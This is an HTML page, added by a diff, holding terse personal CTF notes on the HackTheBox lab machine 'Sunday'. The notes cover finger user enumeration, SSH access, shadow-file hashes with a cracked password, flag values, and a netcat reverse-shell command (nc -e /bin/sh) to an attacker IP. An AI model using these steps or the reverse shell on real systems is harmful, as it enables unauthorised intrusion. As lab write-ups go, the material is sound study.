@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sunday · Will Seligman</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="/index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="htb/machines/sunday.html"></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="/htb/index.html">HackTheBox</a> &rsaquo; <a href="/htb/machines/index.html">Completed Machines</a></div>
+  <h1 id="sunday">Sunday</h1>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>enumerated some users</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>seclist not scanning….<br />
+22022 also open</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><a href="http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz">http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz</a><br />
+./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.129.221.105</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>sammy and summy ssh</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>sammy sits<br />
+sunny connects</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>sunday password works</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>root troll and backup/shadow.backup</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>sammy:\$5\$Ebkn8jlK\$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::<br />
+sunny:\$5\$iRMbpnBv\$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::</p>
+<p><a href="https://linuxize.com/post/etc-shadow-file/">https://linuxize.com/post/etc-shadow-file/</a></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>fighting with hashcat</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>john fixes it</p>
+<p>sammy<br />
+cooldude!</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>a3d9498027ca5187ba1793943ee8a598<br />
+wait, already had this<br />
+now for /root/troll</p>
+<pre><code class="language-bash">nc -e /bin/sh 10.10.14.2 9999
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>fb40fab61d99d37536daeec0d97af9b8</p>
+  </article>
+  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+</main>
+</div>
+<script src="/assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
